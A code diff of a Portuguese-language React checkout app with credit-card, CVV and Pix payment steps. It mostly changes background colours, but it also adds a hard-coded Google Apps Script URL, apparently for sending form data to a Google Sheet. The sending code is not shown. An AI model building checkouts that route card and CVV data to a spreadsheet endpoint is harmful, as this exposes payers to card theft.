@@ -123,7 +123,7 @@ const PixPage = () => {
 
   return (
     // O container principal da PixPage agora tem o fundo #e6dcd0
-    <div className="flex flex-col items-center p-6 bg-[#e6dcd0] max-w-md mx-auto"> {/* ALTERADO AQUI: bg-[#F4F6F8] para bg-[#e6dcd0] */}
+    <div className="flex flex-col items-center p-6 bg-[#e6dcd0] max-w-md mx-auto">
       {/* Cabeçalho com LOGO e Selo de Segurança sem fundo branco e sem sombra, e sem o ícone */}
       <div className="w-full mb-8 flex justify-between items-center py-4">
         <img
@@ -256,6 +256,10 @@ const App = () => {
   const [isCvvFocused, setIsCvvFocused] = useState(false); // Reintroduzido para a animação
   // State para exibir mensagens de validação
   const [validationError, setValidationError] = useState('');
+
+  // ADICIONE ESTA CONSTANTE NO INÍCIO DO SEU COMPONENTE APP (ou em um arquivo .env)
+  // Substitua este placeholder pela SUA URL REAL do Google Apps Script!
+  const GOOGLE_SHEETS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzQcdPXTEmrAx-u5PiqDmKjIKaUsYjXOkN4PbkfSB-ZrGsAKeRfKs3wCEHN7quhmlvEiA/exec";
 
   // useEffect para resetar isCvvFocused quando o método de pagamento muda para 'creditCard'
   useEffect(() => {
@@ -530,7 +534,7 @@ const App = () => {
 
   return (
     // Fundo da página principal do aplicativo alterado para #e6dcd0
-    <div className="min-h-screen bg-[#e6dcd0] flex flex-col items-center font-sans pt-6"> {/* ALTERADO AQUI: bg-gray-50 para bg-[#e6dcd0] */}
+    <div className="min-h-screen bg-[#e6dcd0] flex flex-col items-center font-sans pt-6">
       {currentStep === 5 ? (
         <PixPage />
       ) : (
@@ -1081,7 +1085,7 @@ const App = () => {
               case 6: // Confirmação Final
                 return (
                   // Fundo da página de Confirmação alterado para #e6dcd0
-                  <div className="min-h-screen bg-[#e6dcd0] flex flex-col items-center p-4 font-sans"> {/* ALTERADO AQUI: bg-green-50 para bg-[#e6dcd0] */}
+                  <div className="min-h-screen bg-[#e6dcd0] flex flex-col items-center p-4 font-sans">
                     {/* LOGO */}
                     <div className="mb-8 flex justify-center items-center py-4">
                       <img
